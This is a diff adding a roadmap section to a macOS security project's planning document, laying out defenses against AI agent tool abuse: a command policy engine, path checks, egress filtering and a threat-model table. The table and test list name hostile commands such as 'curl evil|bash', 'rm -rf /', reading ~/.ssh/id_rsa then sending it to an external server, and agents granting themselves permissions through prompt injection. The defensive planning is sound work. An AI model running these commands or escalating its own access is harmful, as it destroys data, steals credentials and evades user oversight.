@@ -677,6 +677,73 @@ Locked+Local     | Metadata only    | Decrypt, chmod444| Decrypt     | Decrypt, 
 | Business model decision | ⬜ Not started | Open source + premium vs direct sale |
 | Landing page / marketing site | ⬜ Not started | — |
 
+### Phase 13: AI Agent Threat Defense — Command Interception & Policy Engine
+
+**Motivation:** Research into Claudian (Obsidian AI plugin), Sage (Gen Digital), NVIDIA OpenShell,
+LlamaFirewall (Meta), and Microsoft Agent Governance Toolkit reveals that the primary attack surface
+for AI agents is tool execution — bash commands, file operations, and network requests. AISecurity
+already has strong file protection (vault) and content scanning (email, messages, clipboard), but
+lacks a systematic defense against agent-initiated tool abuse.
+
+**Research sources:**
+- Claudian (`github.com/YishenTu/claudian`) — bash prefix matching, path boundary checks, tiered permissions
+- Sage (Gen Digital) — YAML-based threat definitions, supply-chain checking, hook-based interception
+- NVIDIA OpenShell — declarative YAML policies, filesystem + network sandboxing, hot-reloadable rules
+- LlamaFirewall (Meta) — chain-of-thought auditing, reduced attack success 17.6% → 1.75%
+- Microsoft Agent Governance Toolkit — sub-ms policy engine, Ed25519 plugin signing, OWASP Agentic Top 10
+- "Your AI, My Shell" (arXiv 2509.22040) — 84% attack success rate on coding editors via prompt injection
+- Trail of Bits — demonstrated prompt-injection-to-RCE chains in real AI agent systems
+
+| Component | Status | Notes |
+|-----------|--------|-------|
+| **Bash Command Policy Engine** | | |
+| YAML policy file for allowed/blocked command patterns | ⬜ Not started | `~/.mac-security/command-policy.yaml` — hot-reloadable |
+| Word-boundary prefix matching (Claudian pattern) | ⬜ Not started | `git:*` matches `git status` but NOT `github-cli` |
+| Command AST parsing for chained commands | ⬜ Not started | Detect `cmd1 && malicious_cmd`, pipes, subshells, variable expansion |
+| Blocked command patterns (rm -rf, curl\|bash, etc.) | ⬜ Not started | Default blocklist + user-configurable allowlist |
+| **File Access Policy** | | |
+| Path prefix matching with directory boundary safety | ⬜ Not started | `/project` matches `/project/src` but NOT `/project-evil` |
+| Symlink-safe validation (realpath before prefix check) | ✅ Done | Already in vault.rs `canonicalize()` — extend to policy engine |
+| Per-agent file access scoping | ⬜ Not started | Agent X can only access ~/project-a, Agent Y only ~/project-b |
+| **Supply Chain Security** | | |
+| Package reputation check (npm, PyPI, Homebrew) | ⬜ Not started | Check package age, download count, known malware lists before install |
+| Ed25519 signing for MCP server verification | ⬜ Not started | Verify MCP server plugins aren't tampered (Microsoft AGT pattern) |
+| **Network Egress Filtering** | | |
+| Outbound connection monitoring via Network Extension | ⬜ Not started | Alert/block when agent processes connect to untrusted destinations |
+| DNS-level filtering for known malicious domains | ⬜ Not started | Block C2 servers, data exfiltration endpoints |
+| **Agent Chain-of-Thought Auditing** | | |
+| Lightweight local classifier for goal hijacking detection | ⬜ Not started | LlamaFirewall-inspired — flag reasoning that diverges from user intent |
+| Action sequence anomaly detection | ⬜ Not started | Alert on: read credentials → network request (exfiltration pattern) |
+| **TCC Database Monitoring** | | |
+| Watch for unauthorized permission grants | ⬜ Not started | Monitor `~/Library/Application Support/com.apple.TCC/TCC.db` changes |
+| Alert on new FDA/Accessibility/Camera grants | ⬜ Not started | Detect agents granting themselves permissions |
+| **macOS Sandbox Profiles** | | |
+| sandbox-exec profiles for agent processes | ⬜ Not started | OS-level filesystem and network restrictions |
+| Hardened Runtime enforcement for agent binaries | ⬜ Not started | Prevent code injection, DYLD_INSERT attacks |
+| **Declarative Policy System** | | |
+| YAML/JSON policy configuration (OpenShell pattern) | ⬜ Not started | Static (locked at startup) + dynamic (hot-reloadable) sections |
+| Sub-millisecond policy evaluation (trie/prefix tree) | ⬜ Not started | Microsoft AGT benchmark: p99 < 0.1ms |
+| Session-scoped vs persistent rule tiers | ⬜ Not started | Claudian pattern: allow-once vs allow-always |
+| Policy audit log (all allow/deny decisions) | ⬜ Not started | Append-only, cryptographically signed |
+| **Verification** | | |
+| Bash command injection test suite | ⬜ Not started | Test chained commands, subshells, variable expansion bypass |
+| Path traversal attack tests | ⬜ Not started | Symlinks, `../` sequences, similarly-named directories |
+| Supply chain attack simulation | ⬜ Not started | Install known-bad package, verify block |
+| Network exfiltration test | ⬜ Not started | Agent reads ~/.ssh/id_rsa then curls external server |
+
+#### Threat Model: AI Agents on macOS (Extended)
+
+| Threat | Attack Vector | Current Defense | Phase 13 Defense |
+|--------|--------------|-----------------|------------------|
+| **Command injection** | Agent executes `rm -rf /` or `curl evil\|bash` | None (no command monitoring) | Bash policy engine + AST parsing |
+| **Prefix collision** | Rule allows `git:*`, agent runs `github-token-stealer` | None | Word-boundary prefix matching |
+| **Path traversal** | Agent reads `/etc/passwd` via `../../` from allowed dir | Vault symlink check only | Path prefix + realpath + policy |
+| **Supply chain** | Agent installs backdoored npm package | None | Package reputation checking |
+| **Permission escalation** | Agent grants itself Accessibility access via TCC | None | TCC database monitoring |
+| **Data exfiltration** | Agent reads credentials then makes network request | Local-only vault (manual) | Network egress filter + action sequence detection |
+| **Goal hijacking** | Prompt injection changes agent's objective mid-task | Prompt injection guard (content) | Chain-of-thought auditing (behavior) |
+| **Plugin tampering** | Malicious MCP server impersonates trusted one | None | Ed25519 plugin signing |
+
 ---
 
 ## 0b. Codebase Audit Results
